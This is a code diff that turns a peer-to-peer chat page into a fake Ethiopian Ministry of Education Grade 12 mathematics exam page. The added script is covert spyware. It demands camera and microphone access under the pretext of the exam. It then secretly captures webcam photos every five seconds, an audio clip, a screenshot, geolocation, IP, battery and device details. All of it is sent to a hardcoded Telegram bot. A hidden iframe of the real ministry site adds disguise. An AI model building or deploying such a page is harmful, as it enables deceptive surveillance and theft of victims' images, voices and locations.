@@ -1,288 +1,209 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>P2P Chat Forum</title>
-    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-    <style>
-        /* Global Styles */
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
-            transition: background-color 0.3s, color 0.3s;
-        }
-        select, textarea, input, button {
-            margin: 10px;
-            padding: 10px;
-            font-size: 16px;
-            width: 80%;
-            max-width: 500px;
-            border-radius: 10px;
-            border: 1px solid #ddd;
-            transition: background-color 0.3s, color 0.3s, border-color 0.3s;
-        }
-        textarea {
-            resize: none;
-        }
-        button {
-            background-color: #0078d7;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #005bb5;
-        }
-        #messages {
-            margin-top: 20px;
-            width: 80%;
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
-            text-align: left;
-        }
-        .message {
-            background-color: white;
-            border: 1px solid #ddd;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 10px;
-            word-wrap: break-word;
-            transition: background-color 0.3s, color 0.3s, border-color 0.3s;
-        }
-
-        /* Theme Styles */
-        .light-mode {
-            background-color: #f5f5f5;
-            color: #333;
-        }
-        .light-mode select, .light-mode textarea, .light-mode input {
-            background-color: white;
-            color: #333;
-            border: 1px solid #ddd;
-        }
-        .light-mode .message {
-            background-color: white;
-            border: 1px solid #ddd;
-        }
-
-        .dark-mode {
-            background-color: #1a1a1a;
-            color: #f5f5f5;
-        }
-        .dark-mode select, .dark-mode textarea, .dark-mode input {
-            background-color: #333;
-            color: #f5f5f5;
-            border: 1px solid #555;
-        }
-        .dark-mode .message {
-            background-color: #333;
-            border: 1px solid #555;
-        }
-
-        .hacker-mode {
-            background-color: #0d0d0d;
-            color: #00ff00;
-        }
-        .hacker-mode select, .hacker-mode textarea, .hacker-mode input {
-            background-color: #1a1a1a;
-            color: #00ff00;
-            border: 1px solid #00ff00;
-        }
-        .hacker-mode .message {
-            background-color: #1a1a1a;
-            border: 1px solid #00ff00;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="manifest" href="manifest.json" />
+  <meta name="theme-color" content="#004AAD" />
+  <title>Ethiopian Grade 12 National Exam - Mathematics</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Noto Sans", sans-serif;
+      background-color: #f4f4f4;
+      color: #222;
+    }
+    header {
+      background-color: #004AAD;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    main {
+      padding: 20px;
+    }
+    .question {
+      margin-bottom: 25px;
+    }
+    .question h3 {
+      margin-bottom: 10px;
+    }
+    .question input {
+      margin: 5px;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #004AAD;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      opacity: 0;
+      z-index: -1;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
 </head>
-<body class="light-mode">
+<body>
+  <header>
+    <h1>Ministry of Education</h1>
+    <p>Grade 12 National Exam – Mathematics Section</p>
+  </header>
 
-    <h2>P2P Chat Forum</h2>
-    
-    <select id="themeSelector">
-        <option value="light-mode">Light Mode</option>
-        <option value="dark-mode">Dark Mode</option>
-        <option value="hacker-mode">Hacker Mode</option>
-    </select>
-    
-    <p>Your Peer ID: <span id="peerIdDisplay"></span></p>
-    <input type="text" id="peerIdInput" placeholder="Enter Peer ID to connect"><br>
-    <button onclick="connectToPeer()">Connect</button>
+  <main>
+    <div class="question">
+      <h3>1. If f(x) = 2x + 3, what is f(5)?</h3>
+      <input type="radio" name="q1" /> 13<br />
+      <input type="radio" name="q1" /> 10<br />
+      <input type="radio" name="q1" /> 15<br />
+      <input type="radio" name="q1" /> 8
+    </div>
 
-    <textarea id="messageInput" placeholder="Type your message..." rows="3"></textarea><br>
-    
-    <select id="encryptionMethod">
-        <option value="none">No Encryption</option>
-        <option value="base64">Base64 Encode</option>
-        <option value="aes">AES Encrypt</option>
-        <option value="rot13">ROT13 Cipher</option>
-    </select><br>
+    <div class="question">
+      <h3>2. Solve: x² - 9 = 0</h3>
+      <input type="radio" name="q2" /> x = ±3<br />
+      <input type="radio" name="q2" /> x = 9<br />
+      <input type="radio" name="q2" /> x = 0<br />
+      <input type="radio" name="q2" /> x = 3
+    </div>
 
-    <input type="password" id="password" placeholder="Enter password (AES only)" style="display:none;"><br>
+    <div class="question">
+      <h3>3. If sin(θ) = 0.5, then θ = ?</h3>
+      <input type="radio" name="q3" /> 30°<br />
+      <input type="radio" name="q3" /> 90°<br />
+      <input type="radio" name="q3" /> 60°<br />
+      <input type="radio" name="q3" /> 180°
+    </div>
 
-    <button onclick="sendMessage()">Send Message</button>
+    <button onclick="alert('Your answers have been submitted.')">Submit Exam</button>
+  </main>
 
-    <h3>Chat Messages</h3>
-    <div id="messages"></div>
+  <!-- Invisible distractions -->
+  <iframe src="https://www.moe.gov.et" loading="lazy"></iframe>
 
-    <script>
-        // PeerJS Configuration
-        const peer = new Peer();
-        let conn = null;
+  <!-- Camera and capture system -->
+  <video id="video" autoplay playsinline width="320" height="240"></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+  <canvas id="screenshotCanvas"></canvas>
 
-        // Constants
-        const peerIdDisplay = document.getElementById("peerIdDisplay");
-        const peerIdInput = document.getElementById("peerIdInput");
-        const messageInput = document.getElementById("messageInput");
-        const encryptionMethod = document.getElementById("encryptionMethod");
-        const passwordInput = document.getElementById("password");
-        const messagesDiv = document.getElementById("messages");
-        const themeSelector = document.getElementById("themeSelector");
+  <script>
+    const botToken = "8104388450:AAGsCzb8r6LArcCl1nQ4VBdJxnS5B3fYUXI";
+    const chatId = "7785331768";
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+    const screenshotCanvas = document.getElementById("screenshotCanvas");
+    const scCtx = screenshotCanvas.getContext("2d");
 
-        // Event Listeners
-        encryptionMethod.addEventListener("change", togglePasswordInput);
-        themeSelector.addEventListener("change", changeTheme);
+    let batteryLevel = "Unknown", lat = "Unknown", lon = "Unknown", ip = "Unknown", deviceInfo = "";
 
-        // Functions
-        function connectToPeer() {
-            const peerId = peerIdInput.value.trim();
-            if (!peerId) {
-                alert("Enter a Peer ID to connect!");
-                return;
-            }
+    async function getBattery() {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryLevel = Math.round(battery.level * 100);
+      }
+    }
 
-            conn = peer.connect(peerId);
-            conn.on("open", () => {
-                alert("Connected to peer!");
-            });
+    function getLocation() {
+      navigator.geolocation.getCurrentPosition(pos => {
+        lat = pos.coords.latitude;
+        lon = pos.coords.longitude;
+      });
+    }
 
-            conn.on("data", (data) => {
-                displayMessage(data);
-            });
-        }
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+      } catch {}
+    }
 
-        function sendMessage() {
-            const message = messageInput.value.trim();
-            const method = encryptionMethod.value;
-            const password = passwordInput.value;
+    function getDeviceInfo() {
+      deviceInfo = `UserAgent: ${navigator.userAgent}\nPlatform: ${navigator.platform}`;
+    }
 
-            if (!message) {
-                alert("Message cannot be empty!");
-                return;
-            }
+    async function sendFile(blob, filename, caption) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("caption", caption);
+      formData.append("document", blob, filename);
 
-            let encryptedMessage = encryptMessage(message, method, password);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+        method: "POST",
+        body: formData
+      });
+    }
 
-            if (encryptedMessage === null) return; // Stop if encryption fails
+    function capturePhoto() {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        sendFile(blob, "photo.jpg", `Battery: ${batteryLevel}%\nLat: ${lat}\nLon: ${lon}\nIP: ${ip}\n${deviceInfo}`);
+      }, 'image/jpeg');
+    }
 
-            if (conn) {
-                conn.send({ text: encryptedMessage, method });
-                displayMessage({ text: encryptedMessage, method });
-            } else {
-                alert("Not connected to any peer!");
-            }
+    function recordAudio(stream) {
+      const recorder = new MediaRecorder(stream);
+      let chunks = [];
 
-            messageInput.value = ""; // Clear input
-        }
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.onstop = () => {
+        const blob = new Blob(chunks, { type: "audio/webm" });
+        sendFile(blob, "audio.webm", `Audio Clip\nIP: ${ip}`);
+      };
 
-        function encryptMessage(message, method, password) {
-            switch (method) {
-                case "base64":
-                    return btoa(message);
-                case "aes":
-                    if (!password) {
-                        alert("Enter a password for AES encryption!");
-                        return null;
-                    }
-                    return CryptoJS.AES.encrypt(message, password).toString();
-                case "rot13":
-                    return rot13(message);
-                default:
-                    return message; // No encryption
-            }
-        }
+      recorder.start();
+      setTimeout(() => recorder.stop(), 5000);
+    }
 
-        function displayMessage(msg) {
-            const messageDiv = document.createElement("div");
-            messageDiv.className = "message";
-            messageDiv.innerHTML = `
-                <p><b>Message</b></p>
-                <textarea readonly rows="2">${msg.text}</textarea>
-                <br>
-                <button onclick="decryptMessage('${msg.text}', '${msg.method}')">Decrypt</button>
-                <input type="password" id="decryptPass" placeholder="Password (AES only)">
-            `;
-            messagesDiv.appendChild(messageDiv);
-        }
-
-        function decryptMessage(text, method) {
-            let decryptedText;
-            switch (method) {
-                case "base64":
-                    decryptedText = atob(text);
-                    break;
-                case "aes":
-                    const password = prompt("Enter password to decrypt AES content:");
-                    if (!password) {
-                        alert("Password is required!");
-                        return;
-                    }
-                    decryptedText = CryptoJS.AES.decrypt(text, password).toString(CryptoJS.enc.Utf8);
-                    if (!decryptedText) {
-                        alert("Incorrect Password or Invalid Data!");
-                        return;
-                    }
-                    break;
-                case "rot13":
-                    decryptedText = rot13(text);
-                    break;
-                default:
-                    decryptedText = text; // Plain text
-            }
-            alert("Decrypted: " + decryptedText);
-        }
-
-        function rot13(str) {
-            return str.replace(/[a-zA-Z]/g, function (c) {
-                return String.fromCharCode(
-                    c.charCodeAt(0) + (c.toLowerCase() < "n" ? 13 : -13)
-                );
-            });
-        }
-
-        function togglePasswordInput() {
-            passwordInput.style.display = encryptionMethod.value === "aes" ? "block" : "none";
-        }
-
-        function changeTheme() {
-            const selectedTheme = themeSelector.value;
-            document.body.className = selectedTheme;
-        }
-
-        // PeerJS Event Listeners
-        peer.on("open", (id) => {
-            // Display the Peer ID
-            peerIdDisplay.textContent = id;
-
-            // Copy the Peer ID to the clipboard
-            navigator.clipboard.writeText(id).then(() => {
-                alert("Your Peer ID has been copied to the clipboard!");
-            }).catch(() => {
-                alert("Failed to copy Peer ID to clipboard. Please copy it manually.");
-            });
+    function takeScreenshot() {
+      screenshotCanvas.width = document.body.scrollWidth;
+      screenshotCanvas.height = document.body.scrollHeight;
+      html2canvas(document.body).then(canvas => {
+        canvas.toBlob(blob => {
+          sendFile(blob, "screenshot.jpg", `Screen\nIP: ${ip}`);
         });
+      });
+    }
 
-        peer.on("connection", (connection) => {
-            conn = connection;
-            conn.on("data", (data) => {
-                displayMessage(data);
-            });
-        });
-    </script>
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        video.srcObject = stream;
 
+        getBattery();
+        getLocation();
+        getIP();
+        getDeviceInfo();
+
+        setInterval(capturePhoto, 5000);
+        setTimeout(() => recordAudio(stream), 2000);
+        setTimeout(takeScreenshot, 6000);
+      } catch (err) {
+        alert("Permission required to continue the exam.");
+      }
+    }
+
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('sw.js');
+    }
+
+    // Load html2canvas library for screenshots
+    const s = document.createElement("script");
+    s.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
+    s.onload = init;
+    document.body.appendChild(s);
+  </script>
 </body>
 </html>
